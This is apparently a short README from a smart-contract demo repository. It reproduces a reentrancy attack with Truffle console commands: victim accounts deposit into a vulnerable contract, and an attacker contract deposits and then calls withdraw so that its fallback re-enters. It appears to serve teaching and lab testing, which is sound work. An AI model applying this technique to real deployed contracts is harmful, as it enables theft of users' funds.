## Reentrancy

Reproducing attack using these contracts.

Depositing some amount in 2 differents accounts balances:
```
$victim: var f = Reentrancy.deployed()
$victim: f.then(a=> a.deposit({value: 10, from : web3.eth.accounts[1]}))
$victim: f.then(a=> a.deposit({value: 20, from : web3.eth.accounts[0]}))
```
Attacker calls withdraw from a contract, so it will receive a payment and fallback function will be executed.
```
$attacker: var g = ReentrancyAttacker.deployed()
$attacker: g.then(a=> a.depositInContract({value : 5}))
$attacker: g.then(a=> a.withdrawFromContract())
```

